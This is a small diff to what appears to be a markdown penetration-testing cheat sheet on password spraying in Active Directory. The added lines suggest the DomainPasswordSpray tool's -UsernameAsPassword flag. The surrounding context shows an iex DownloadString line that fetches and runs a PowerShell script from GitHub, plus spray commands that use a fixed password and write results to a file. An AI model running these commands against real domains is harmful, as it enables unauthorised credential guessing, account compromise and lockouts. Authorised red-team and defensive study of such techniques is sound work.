@@ -27,6 +27,12 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-DomainPasswordSpray -Password Welkom01 -OutFile c:\temp\spray-results.txt
 ```
 
+It can also be interesting to use the `-UsernameAsPassword` flag.
+
+```plain
+Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile c:\temp\spray-results.txt
+```
+
 ### URL list
 
 * [Github.com - DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
